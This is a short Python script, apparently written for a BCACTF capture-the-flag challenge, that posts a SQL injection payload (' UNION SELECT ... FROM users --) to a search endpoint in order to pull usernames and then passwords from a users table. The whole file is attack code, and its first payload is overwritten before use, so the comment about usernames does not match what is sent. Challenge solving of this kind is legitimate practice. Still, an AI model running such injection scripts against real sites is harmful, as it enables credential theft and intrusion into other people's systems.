import requests

# Target URL
url = "http://challs.bcactf.com:30147/search"

# SQL injection payload to extract usernames from users table
# Using UNION SELECT to get data from users table
payload = "' UNION SELECT username FROM users --"
payload = "' UNION SELECT password FROM users --"

# Send the request
data = {"query": payload}
response = requests.post(url, data=data)

print("Response status:", response.status_code)
print("Response content:")
print(response.text)